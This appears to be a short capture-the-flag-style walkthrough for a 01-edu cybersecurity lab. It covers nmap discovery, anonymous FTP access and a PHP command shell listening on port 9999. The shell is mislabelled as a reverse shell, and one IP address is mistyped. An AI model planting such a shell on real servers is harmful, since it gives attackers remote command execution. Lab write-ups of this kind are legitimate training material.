> [Project](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local)
> [Audit](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local/audit)


1. With nmap we discover open hosts
```bash
nmap -sn 192.168.1.0/24
```
It reveals that there is an host up - 192.168.1.2

2. We scan the host with nmap for open ports
```bash
   nmap 192.168.1.2
```
We can see that the host has open ports for FTP, SSH, HTTP - 21, 22, 80 respectively

3. We open the host in browser and can confirm that this host is for our exercise.
4. We connect to IP through FTP
```bash
   ftp 192.169.1.2
```
It asks for user so we try anonymous login.
We get access.

5. We see what files the ftp server contains
```bash
   ls
```
There  is life.c and template.html

6. We download both files and see that they contain nothing useful
   But we now know that the ftp server may be exploited to upload a reverse shell.

Reverse-shell
```php
<?php
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_bind($socket, '0.0.0.0', 9999);
        socket_listen($socket, 1);
        $conn = socket_accept($socket);
        while(true) {
                if (!socket_write($conn, "$ ", 2)) exit;
                $buf = socket_read($conn, 100);
                $cmd = popen("$buf", "r");
                while (!feof($cmd)){
                        $msg = fgetc($cmd);
                        socket_write($conn, $msg, strlen($msg));
                }
        }
?>
```